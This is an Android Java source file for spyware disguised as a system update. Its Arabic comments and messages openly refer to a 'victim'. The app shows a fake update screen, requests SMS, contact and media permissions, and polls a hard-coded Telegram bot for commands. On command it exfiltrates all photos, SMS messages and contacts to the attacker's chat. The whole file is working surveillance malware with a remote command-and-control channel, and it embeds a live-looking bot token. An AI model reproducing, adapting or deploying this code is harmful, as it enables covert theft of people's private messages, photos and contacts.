package com.vipih;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.widget.LinearLayout;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int PERMISSION_CODE = 100;
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";
    
    private long lastUpdateId = 0;
    private Context ctx;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ctx = getApplicationContext();

        // واجهة وهمية لكي لا يشك الضحية
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);
        TextView tv = new TextView(this);
        tv.setText("System Update in progress...\nPlease do not close the app.");
        tv.setTextSize(18);
        layout.addView(tv);
        setContentView(layout);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CONTACTS
            }, PERMISSION_CODE);
        } else {
            startBackground();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        startBackground();
    }

    private void startBackground() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // إرسال لوحة التحكم للبوت
                    sendControlPanel();

                    // الاستماع للأوامر
                    while (true) {
                        checkUpdates();
                        try { Thread.sleep(3000); } catch (Exception e) {}
                    }
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendControlPanel() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");

            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", "✅ تم الاتصال بجهاز الضحية بنجاح!\n\nاختر العملية التي تريد سحبها:");

            JSONArray keyboard = new JSONArray();
            
            JSONArray row1 = new JSONArray();
            JSONObject btnPhotos = new JSONObject();
            btnPhotos.put("text", "📸 سحب الصور");
            btnPhotos.put("callback_data", "cmd_photos");
            row1.put(btnPhotos);
            keyboard.put(row1);

            JSONArray row2 = new JSONArray();
            JSONObject btnSms = new JSONObject();
            btnSms.put("text", "💬 سحب الرسائل SMS");
            btnSms.put("callback_data", "cmd_sms");
            row2.put(btnSms);
            keyboard.put(row2);

            JSONArray row3 = new JSONArray();
            JSONObject btnContacts = new JSONObject();
            btnContacts.put("text", "📞 سحب الأرقام");
            btnContacts.put("callback_data", "cmd_contacts");
            row3.put(btnContacts);
            keyboard.put(row3);

            JSONObject replyMarkup = new JSONObject();
            replyMarkup.put("inline_keyboard", keyboard);
            json.put("reply_markup", replyMarkup);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(json.toString());
            os.flush();
            os.close();

            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void checkUpdates() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            InputStream input = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(input));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();

            JSONObject jsonResponse = new JSONObject(response.toString());
            JSONArray result = jsonResponse.getJSONArray("result");
            
            for (int i = 0; i < result.length(); i++) {
                JSONObject update = result.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                
                if (update.has("callback_query")) {
                    JSONObject callbackQuery = update.getJSONObject("callback_query");
                    String data = callbackQuery.getString("data");
                    String callbackId = callbackQuery.getString("id");

                    answerCallback(callbackId, "جاري التنفيذ...");

                    if (data.equals("cmd_photos")) {
                        sendPhotos();
                    } else if (data.equals("cmd_sms")) {
                        sendSms();
                    } else if (data.equals("cmd_contacts")) {
                        sendContacts();
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void answerCallback(String callbackId, String text) {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/answerCallbackQuery?callback_query_id=" + callbackId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendPhotos() {
        try {
            String[] projection = {MediaStore.Images.Media._ID};
            Cursor cursor = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor == null) return;
            int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            List<Uri> batchUris = new ArrayList<>();

            while (cursor.moveToNext()) {
                int id = cursor.getInt(idIndex);
                Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
                batchUris.add(contentUri);

                if (batchUris.size() == 10) {
                    sendMediaGroup(batchUris);
                    batchUris.clear();
                    Thread.sleep(300);
                }
            }
            cursor.close();
            if (!batchUris.isEmpty()) sendMediaGroup(batchUris);
            sendMsg("✅ تم الانتهاء من سحب الصور.");
        } catch (Exception e) {}
    }

    private void sendSms() {
        try {
            StringBuilder smsBuilder = new StringBuilder();
            Cursor cursor = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    smsBuilder.append("من: ").append(address).append("\nالرسالة: ").append(body).append("\n-------------------\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
            sendFile("messages_sms.txt", smsBuilder.toString());
            sendMsg("✅ تم سحب الرسائل بنجاح.");
        } catch (Exception e) {
            sendMsg("❌ خطأ في سحب الرسائل: " + e.getMessage());
        }
    }

    private void sendContacts() {
        try {
            StringBuilder contactsBuilder = new StringBuilder();
            Cursor cursor = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsBuilder.append("الاسم: ").append(name).append(" | الرقم: ").append(phone).append("\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
            sendFile("contacts.txt", contactsBuilder.toString());
            sendMsg("✅ تم سحب الأرقام بنجاح.");
        } catch (Exception e) {
            sendMsg("❌ خطأ في سحب الأرقام: " + e.getMessage());
        }
    }

    private void sendMsg(String text) {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendFile(String filename, String content) {
        try {
            String boundary = "*****" + System.currentTimeMillis();
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"" + lineEnd);
            request.writeBytes("Content-Type: text/plain" + lineEnd + lineEnd);
            request.write(content.getBytes("UTF-8"));
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            request.flush();
            request.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendMediaGroup(List<Uri> uris) {
        String boundary = "*****" + System.currentTimeMillis();
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMediaGroup");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            JSONArray mediaArray = new JSONArray();
            List<byte[]> imageDataList = new ArrayList<>();

            for (int i = 0; i < uris.size(); i++) {
                byte[] data = compressImage(uris.get(i));
                if (data != null) {
                    imageDataList.add(data);
                    JSONObject mediaObj = new JSONObject();
                    mediaObj.put("type", "photo");
                    mediaObj.put("media", "attach://file" + i);
                    mediaArray.put(mediaObj);
                }
            }

            if (imageDataList.isEmpty()) return;

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
            request.writeBytes(mediaArray.toString() + lineEnd);

            for (int i = 0; i < imageDataList.size(); i++) {
                request.writeBytes(twoHyphens + boundary + lineEnd);
                request.writeBytes("Content-Disposition: form-data; name=\"file" + i + "\"; filename=\"img" + i + ".jpg\"" + lineEnd);
                request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
                request.write(imageDataList.get(i));
                request.writeBytes(lineEnd);
            }

            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush();
            request.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {}
    }

    private byte[] compressImage(Uri uri) {
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = true;
            InputStream input = ctx.getContentResolver().openInputStream(uri);
            BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();

            int inSampleSize = 1;
            if (options.outHeight > 800 || options.outWidth > 800) {
                final int halfHeight = options.outHeight / 2;
                final int halfWidth = options.outWidth / 2;
                while ((halfHeight / inSampleSize) >= 800 && (halfWidth / inSampleSize) >= 800) {
                    inSampleSize *= 2;
                }
            }
            options.inJustDecodeBounds = false;
            options.inSampleSize = inSampleSize;

            input = ctx.getContentResolver().openInputStream(uri);
            Bitmap bitmap = BitmapFactory.decodeStream(input, null, options);
            if (input != null) input.close();
            if (bitmap == null) return null;

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream);
            bitmap.recycle();
            return stream.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }
}